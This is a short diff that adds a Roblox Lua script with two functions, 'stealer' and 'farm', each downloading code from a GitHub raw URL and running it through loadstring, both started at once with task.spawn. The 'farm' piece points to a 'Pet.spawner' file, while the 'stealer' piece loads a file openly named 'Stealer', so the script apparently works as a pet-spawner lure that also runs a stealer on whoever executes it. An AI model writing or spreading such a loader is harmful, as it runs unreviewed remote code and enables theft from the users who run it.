@@ -1,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/kjrmz/NewScripts/refs/heads/main/Stealer'))()
+end
+local function farm()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/kjrmz/NewScripts/refs/heads/main/Pet.spawner.txt'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
